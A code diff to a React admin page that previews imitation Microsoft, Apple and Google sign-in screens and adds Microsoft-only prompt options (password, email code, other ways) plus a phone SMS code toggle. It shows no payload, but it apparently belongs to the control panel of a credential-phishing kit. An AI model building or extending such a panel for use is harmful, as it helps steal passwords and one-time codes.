@@ -1,5 +1,5 @@
 import { useState } from 'react';
-import { Monitor, Smartphone, Tablet, Moon, Sun, Key } from 'lucide-react';
+import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -28,6 +28,7 @@ const GoogleLogo = () => (
 type Provider = 'microsoft' | 'apple' | 'google';
 type Device = 'desktop' | 'tablet' | 'mobile';
 type Theme = 'light' | 'dark';
+type Prompt = 'password' | 'email-code' | 'other-ways';
 
 const PROVIDER_COLORS: Record<Provider, string> = {
   microsoft: '#0078D4',
@@ -35,15 +36,32 @@ const PROVIDER_COLORS: Record<Provider, string> = {
   google: '#4285F4',
 };
 
-function loginSrc(provider: Provider, device: Device, theme: Theme) {
+function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean) {
   const base = import.meta.env.BASE_URL.replace(/\/$/, '');
-  return `${base}/?provider=${provider}&device=${device}&theme=${theme}`;
+  const phonePart = provider === 'microsoft' && phoneEnabled ? '&phone=1' : '';
+  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}`;
+}
+
+function Toggle({ enabled, onToggle }: { enabled: boolean; onToggle: () => void }) {
+  return (
+    <button
+      onClick={onToggle}
+      className={`relative w-9 h-5 rounded-full transition-colors flex-shrink-0 focus:outline-none ${enabled ? 'bg-[#0078D4]' : 'bg-[#3a3f4a]'}`}
+      aria-pressed={enabled}
+    >
+      <span
+        className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform ${enabled ? 'translate-x-4' : 'translate-x-0.5'}`}
+      />
+    </button>
+  );
 }
 
 export default function AdminPage() {
   const [provider, setProvider] = useState<Provider>('microsoft');
   const [device, setDevice] = useState<Device>('desktop');
   const [theme, setTheme] = useState<Theme>('light');
+  const [prompt, setPrompt] = useState<Prompt>('password');
+  const [phoneEnabled, setPhoneEnabled] = useState(false);
 
   const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
     { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogo /> },
@@ -57,7 +75,13 @@ export default function AdminPage() {
     { id: 'mobile',  name: 'Mobile',  icon: <Smartphone className="w-4 h-4" /> },
   ];
 
-  const src = loginSrc(provider, device, theme);
+  const prompts: { id: Prompt; name: string; icon: React.ReactNode; desc: string }[] = [
+    { id: 'password',    name: 'Password',    icon: <Lock className="w-3.5 h-3.5 text-white" />,       desc: 'Standard password entry' },
+    { id: 'email-code',  name: 'Email code',  icon: <Mail className="w-3.5 h-3.5 text-white" />,       desc: 'Send code to email' },
+    { id: 'other-ways',  name: 'Other ways',  icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
+  ];
+
+  const src = loginSrc(provider, device, theme, prompt, phoneEnabled);
   const accentColor = PROVIDER_COLORS[provider];
 
   return (
@@ -82,7 +106,7 @@ export default function AdminPage() {
               {providers.map(p => (
                 <button
                   key={p.id}
-                  onClick={() => setProvider(p.id)}
+                  onClick={() => { setProvider(p.id); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
                   data-testid={`provider-btn-${p.id}`}
                   className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left
                     ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
@@ -143,6 +167,56 @@ export default function AdminPage() {
             </div>
           </section>
 
+          {/* Prompt — Microsoft only */}
+          {provider === 'microsoft' && (
+            <section className="space-y-2">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Prompt</p>
+              <div className="space-y-1">
+                {prompts.map(p => (
+                  <button
+                    key={p.id}
+                    onClick={() => setPrompt(p.id)}
+                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left
+                      ${prompt === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
+                  >
+                    <div className={`w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0 shadow-sm transition-colors
+                      ${prompt === p.id ? 'bg-[#0078D4]' : 'bg-[#2a2d35]'}`}>
+                      {p.icon}
+                    </div>
+                    <div className="flex-1 min-w-0">
+                      <div className={`text-[13px] font-medium leading-none mb-0.5 ${prompt === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>
+                        {p.name}
+                      </div>
+                      <div className="text-[11px] text-[#606672] truncate">{p.desc}</div>
+                    </div>
+                    {prompt === p.id && (
+                      <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />
+                    )}
+                  </button>
+                ))}
+              </div>
+            </section>
+          )}
+
+          {/* Options — Microsoft only */}
+          {provider === 'microsoft' && (
+            <section className="space-y-2">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Options</p>
+              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24] divide-y divide-[#2d3139]">
+                <div className="flex items-center justify-between px-3 py-3">
+                  <div className="flex items-center gap-2.5">
+                    <Smartphone className="w-4 h-4 text-[#6b7280]" />
+                    <div>
+                      <div className="text-[13px] text-[#aeb5c0] font-medium leading-none mb-0.5">Phone SMS</div>
+                      <div className="text-[10px] text-[#606672]">Show phone code option</div>
+                    </div>
+                  </div>
+                  <Toggle enabled={phoneEnabled} onToggle={() => setPhoneEnabled(v => !v)} />
+                </div>
+              </div>
+            </section>
+          )}
+
         </div>
 
         <div className="h-10 flex items-center justify-center border-t border-[#2d3139]/50 text-[11px] text-[#555d6b] flex-shrink-0">
@@ -179,7 +253,6 @@ export default function AdminPage() {
               className="flex flex-col rounded-xl overflow-hidden shadow-2xl ring-1 ring-white/10"
               style={{ width: 980, height: 620, transform: 'scale(0.88)', transformOrigin: 'center center' }}
             >
-              {/* Browser chrome */}
               <div className="h-9 bg-[#2a2a2a] flex items-center px-4 flex-shrink-0 border-b border-black/30">
                 <div className="flex gap-1.5 mr-4">
                   <div className="w-3 h-3 rounded-full bg-[#ff5f56]" />
@@ -210,12 +283,7 @@ export default function AdminPage() {
               <div className="absolute top-1/2 -left-4 w-1.5 h-14 bg-[#2a2a2a] rounded-l-md -translate-y-1/2" />
               <div className="absolute top-1/2 -right-4 w-1.5 h-14 bg-[#2a2a2a] rounded-r-md -translate-y-1/2" />
               <div className="w-full h-full rounded-[2rem] overflow-hidden border border-white/10">
-                <iframe
-                  key={src}
-                  src={src}
-                  className="w-full h-full border-0"
-                  title="Login preview"
-                />
+                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
               </div>
             </div>
           )}
@@ -231,16 +299,10 @@ export default function AdminPage() {
               <div className="absolute top-52 -left-3.5 w-1.5 h-14 bg-[#1a1a1a] rounded-l-md" />
               <div className="absolute top-32 -right-3.5 w-1.5 h-20 bg-[#1a1a1a] rounded-r-md" />
               <div className="w-full h-full rounded-[2.3rem] overflow-hidden relative bg-white">
-                {/* Notch */}
                 <div className="absolute top-0 inset-x-0 flex justify-center z-20 pointer-events-none">
                   <div className="w-[100px] h-[22px] bg-black rounded-b-3xl" />
                 </div>
-                <iframe
-                  key={src}
-                  src={src}
-                  className="w-full h-full border-0"
-                  title="Login preview"
-                />
+                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
               </div>
             </div>
           )}
